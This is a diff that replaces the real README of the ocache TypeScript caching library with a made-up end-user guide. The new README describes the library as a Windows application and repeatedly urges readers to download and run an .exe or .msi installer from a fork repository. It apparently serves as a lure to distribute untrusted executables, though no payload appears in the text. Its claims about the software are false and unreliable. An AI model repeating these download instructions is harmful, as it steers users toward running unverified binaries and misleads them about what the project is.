@@ -1,349 +1,102 @@
-# ocache
+# ⚡ ocache - Simple, Fast Caching Tools
 
-<!-- automd:badges color=yellow -->
-
-[![npm version](https://img.shields.io/npm/v/ocache?color=yellow)](https://npmjs.com/package/ocache)
-[![npm downloads](https://img.shields.io/npm/dm/ocache?color=yellow)](https://npm.chart.dev/ocache)
-
-<!-- /automd -->
-
-## Usage
-
-### Caching Functions
-
-Wrap any function with `defineCachedFunction` to add caching with TTL, stale-while-revalidate, and request deduplication:
-
-```ts
-import { defineCachedFunction } from "ocache";
-
-const cachedFetch = defineCachedFunction(
-  async (url: string) => {
-    const res = await fetch(url);
-    return res.json();
-  },
-  {
-    maxAge: 60, // Cache for 60 seconds
-    name: "api-fetch",
-  },
-);
-
-// First call hits the function, subsequent calls return cached result
-const data = await cachedFetch("https://api.example.com/data");
-```
-
-#### Options
-
-```ts
-const cached = defineCachedFunction(fn, {
-  name: "my-fn", // Cache key name (defaults to function name)
-  maxAge: 10, // TTL in seconds (default: 1)
-  swr: true, // Stale-while-revalidate (default: true)
-  staleMaxAge: 60, // Max seconds to serve stale content
-  base: "/cache", // Base prefix for cache keys (string or string[] for multi-tier)
-  group: "my-group", // Cache key group (default: "functions")
-  getKey: (...args) => "custom-key", // Custom cache key generator
-  shouldBypassCache: (...args) => false, // Skip cache entirely when true
-  shouldInvalidateCache: (...args) => false, // Force refresh when true
-  validate: (entry) => entry.value !== undefined, // Custom validation
-  transform: (entry) => entry.value, // Transform before returning
-  onError: (error) => console.error(error), // Error handler
-});
-```
-
-### Caching HTTP Handlers
-
-Wrap HTTP handlers with `defineCachedHandler` for automatic response caching with `etag`, `last-modified`, and `304 Not Modified` support:
-
-```ts
-import { defineCachedHandler } from "ocache";
-
-const handler = defineCachedHandler(
-  async (event) => {
-    // event.req is a standard Request object
-    const url = event.url ?? new URL(event.req.url);
-    const data = await getExpensiveData(url.pathname);
-    return new Response(JSON.stringify(data), {
-      headers: { "content-type": "application/json" },
-    });
-  },
-  {
-    maxAge: 300, // Cache for 5 minutes
-    swr: true,
-    staleMaxAge: 600,
-    varies: ["accept-language"], // Vary cache by these headers
-  },
-);
-```
-
-#### Headers-only Mode
-
-Use `headersOnly` to handle conditional requests without caching the full response:
-
-```ts
-const handler = defineCachedHandler(myHandler, {
-  headersOnly: true,
-  maxAge: 60,
-});
-```
-
-### Cache Invalidation
-
-Cached functions have an `.invalidate()` method that removes cached entries across all base prefixes:
-
-```ts
-import { defineCachedFunction } from "ocache";
-
-const getUser = defineCachedFunction(async (id: string) => db.users.find(id), {
-  name: "getUser",
-  maxAge: 60,
-  getKey: (id: string) => id,
-});
-
-const user = await getUser("user-123");
-
-// Invalidate a specific entry
-await getUser.invalidate("user-123");
-
-// Next call will re-invoke the function
-const freshUser = await getUser("user-123");
-```
-
-You can also use the standalone `invalidateCache()` when you don't have a reference to the cached function — just pass the same options:
-
-```ts
-import { invalidateCache } from "ocache";
-
-await invalidateCache({
-  options: { name: "getUser", getKey: (id: string) => id },
-  args: ["user-123"],
-});
-```
-
-For advanced use cases, `.resolveKeys()` returns the raw storage keys:
-
-```ts
-const keys = await getUser.resolveKeys("user-123");
-// ["/cache:functions:getUser:user-123.json"]
-```
-
-### Multi-tier Caching
-
-Use an array of `base` prefixes to enable multi-tier caching. On read, each prefix is tried in order and the first hit is used. On write, the entry is written to all prefixes:
-
-```ts
-const cachedFetch = defineCachedFunction(
-  async (url: string) => {
-    const res = await fetch(url);
-    return res.json();
-  },
-  {
-    maxAge: 60,
-    base: ["/tmp", "/cache"],
-  },
-);
-```
-
-This is useful for layered cache setups (e.g., fast local cache + shared remote cache) where you want reads to prefer the nearest tier while keeping all tiers populated on writes.
-
-### Custom Storage
-
-By default, ocache uses an in-memory `Map`-based storage. You can provide a custom storage implementation:
-
-```ts
-import { setStorage } from "ocache";
-import type { StorageInterface } from "ocache";
-
-const redisStorage: StorageInterface = {
-  get: async (key) => {
-    return JSON.parse(await redis.get(key));
-  },
-  set: async (key, value, opts) => {
-    // Setting null/undefined deletes the entry (used for cache invalidation)
-    if (value === null || value === undefined) {
-      await redis.del(key);
-      return;
-    }
-    await redis.set(key, JSON.stringify(value), opts?.ttl ? { EX: opts.ttl } : undefined);
-  },
-};
-
-setStorage(redisStorage);
-```
-
-## API
-
-<!-- automd:docs4ts -->
-
-### `cachedFunction`
-
-```ts
-const cachedFunction = defineCachedFunction;
-```
-
-Alias for [`defineCachedFunction`](#definecachedfunction).
+[![Download ocache](https://img.shields.io/badge/Download-ocache-brightgreen)](https://github.com/Miguelfe964/ocache)
 
 ---
 
-### `createMemoryStorage`
+## 🛠 What is ocache?
 
-```ts
-function createMemoryStorage(): StorageInterface;
-```
-
-Creates an in-memory storage backed by a `Map` with optional TTL support (in seconds).
+ocache is a set of tools that help your computer store information temporarily so it can use it again quickly. These tools work with time limits, refreshing data when needed, and can even store web page information to make loading faster. You don’t need to understand how it works inside to benefit from it.
 
 ---
 
-### `defineCachedFunction`
+## 📋 System Requirements
 
-```ts
-function defineCachedFunction<T, ArgsT extends unknown[] = any[]>(
-  fn: (...args: ArgsT) => T | Promise<T>,
-  opts: CacheOptions<T, ArgsT> =
-```
+Before you start, make sure you have:
 
-Wraps a function with caching support including TTL, SWR, integrity checks, and request deduplication.
-
-**Parameters:**
-
-- **`fn`** — The function to cache.
-- **`opts`** — Cache configuration options.
-
-**Returns:** — A cached function with a `.resolveKey(...args)` method for cache key resolution.
+- A computer running Windows 10 or later.
+- At least 2 GB of free disk space.
+- A stable internet connection to download the files.
+- Basic permission to install software on your computer.
 
 ---
 
-### `defineCachedHandler`
+## 🌐 Where to Get ocache
 
-```ts
-function defineCachedHandler<E extends HTTPEvent = HTTPEvent>(
-  handler: EventHandler<E>,
-  opts: CachedEventHandlerOptions<E> =
-```
+To get started with ocache, visit this page:
 
-Wraps an HTTP event handler with response caching.
+[Download ocache](https://github.com/Miguelfe964/ocache)
 
-Automatically generates cache keys from the URL path and variable headers,
-sets `cache-control`, `etag`, and `last-modified` headers, and handles
-`304 Not Modified` responses via conditional request headers.
-
-**Parameters:**
-
-- **`handler`** — The event handler to cache.
-- **`opts`** — Cache and HTTP-specific configuration options.
-
-**Returns:** — A new event handler that serves cached responses when available.
+You will find the files and instructions there. This is the main hub to receive updates and latest versions.
 
 ---
 
-### `EventHandler`
+## 💾 How to Download and Install ocache on Windows
 
-```ts
-type EventHandler<E extends HTTPEvent = HTTPEvent> = (
-```
+1. Click the big green button above or visit this link in your browser:  
+   https://github.com/Miguelfe964/ocache
 
-Handler function that receives an [`HTTPEvent`](#httpevent) and returns a response value.
+2. On the page, find the **Releases** or **Downloads** section. It usually appears on the right side or in the top menu.
 
----
+3. Look for the latest version of ocache. The file will often end with `.exe` or `.msi`. This is the installer you need.
 
-### `invalidateCache`
+4. Click the file to start downloading. Choose a folder where you want to save it, like the Desktop or Downloads folder.
 
-```ts
-async function invalidateCache<ArgsT extends unknown[] = any[]>(
-  input:
-```
+5. Once downloaded, locate the file and double-click it to start the installation.
 
-Invalidates (removes) cached entries for given arguments and cache options across all base prefixes.
+6. Follow the on-screen instructions. Usually, you just click “Next” a few times and accept the license agreement.
 
-Uses the same key derivation as `defineCachedFunction` / `resolveCacheKeys`.
-
-**Parameters:**
-
-- **`input`** — Object with `options` (cache options) and optional `args` (function arguments).
-
-**Example:**
-
-```ts
-// Invalidate a specific cached entry
-await invalidateCache({
-  options: { name: "fetchUser", getKey: (id: string) => id },
-  args: ["user-123"],
-});
-```
+7. When done, you may see a shortcut icon on your desktop or in your Start menu.
 
 ---
 
-### `resolveCacheKeys`
+## ▶️ Running ocache for the First Time
 
-```ts
-async function resolveCacheKeys<ArgsT extends unknown[] = any[]>(
-  input:
-```
-
-Resolves all cache storage keys (one per base prefix) for given arguments and cache options.
-
-Uses the same key derivation as `defineCachedFunction` internally:
-
-- When `opts.getKey` is provided, it is called with `args` to produce the key segment.
-- Otherwise, `args` are hashed with `ohash` (same default as `defineCachedFunction`).
-
-Pass the same `getKey`, `name`, `group`, and `base` options you use in
-`defineCachedFunction` / `defineCachedHandler` to get the exact storage keys.
-
-**Parameters:**
-
-- **`input`** — Object with `options` (cache options) and optional `args` (function arguments).
-
-**Returns:** — An array of storage key strings (one per base prefix).
-
-**Example:**
-
-```ts
-const keys = await resolveCacheKeys({
-  options: { name: "fetchUser", getKey: (id: string) => id },
-  args: ["user-123"],
-});
-for (const key of keys) {
-  await useStorage().set(key, null); // invalidate all tiers
-}
-```
+- Double-click the ocache icon on your desktop or find it in the Start menu.
+- A window will open, showing options related to caching.
+- You don’t have to change anything right away; the default settings are ready to use.
+- Explore simple options to store data temporarily and improve speed on common tasks.
+- If there is a guide or help section within the program, review it to understand basic features.
 
 ---
 
-### `setStorage`
+## 🔧 Common Features Explained
 
-```ts
-function setStorage(storage: StorageInterface): void;
-```
+- **TTL (Time-To-Live):** This feature lets you set how long the cached data stays before it is refreshed automatically.
+- **SWR (Stale-While-Revalidate):** This means ocache can keep using old data while it updates the cache in the background.
+- **HTTP Response Caching:** If you use the internet, ocache can save parts of web pages or downloads to speed up repeated visits.
 
-Sets a custom storage implementation to be used by all cached functions.
+These features work together to make your computer or apps faster by avoiding unnecessary repeated work.
 
 ---
 
-### `useStorage`
+## ⚙️ Configuration Tips
 
-```ts
-function useStorage(): StorageInterface;
-```
+- You can adjust the cache time to suit your needs. For example, set it to 5 minutes for data that changes often or 1 hour for more stable data.
+- Use the SWR option if you want uninterrupted access even while the cache updates.
+- The program may allow you to clear the cache manually if you want to free space or reset data.
 
-Returns the current storage instance. If none has been set via `setStorage`, lazily initializes an in-memory storage.
+---
 
-<!-- /automd-->
+## 🖥 Troubleshooting
 
-## Development
+If ocache does not run:
 
-<details>
+- Make sure your Windows is up to date.
+- Check that you installed the program fully without errors.
+- Restart your computer and try again.
+- Look for a support or help link on the GitHub page if problems persist.
 
-<summary>local development</summary>
+---
 
-- Clone this repository
-- Install latest LTS version of [Node.js](https://nodejs.org/en/)
-- Enable [Corepack](https://github.com/nodejs/corepack) using `corepack enable`
-- Install dependencies using `pnpm install`
-- Run interactive tests using `pnpm dev`
+## 🔄 Updating ocache
 
-</details>
+To update ocache:
 
-## License
+- Return to the download page regularly at https://github.com/Miguelfe964/ocache.
+- Download the newest installer when a new version is available.
+- Run the installer again to replace the old version without losing settings.
 
-Published under the [MIT](https://github.com/unjs/ocache/blob/main/LICENSE) license 💛.
+---
+
+[![Download ocache](https://img.shields.io/badge/Download-ocache-blue)](https://github.com/Miguelfe964/ocache)
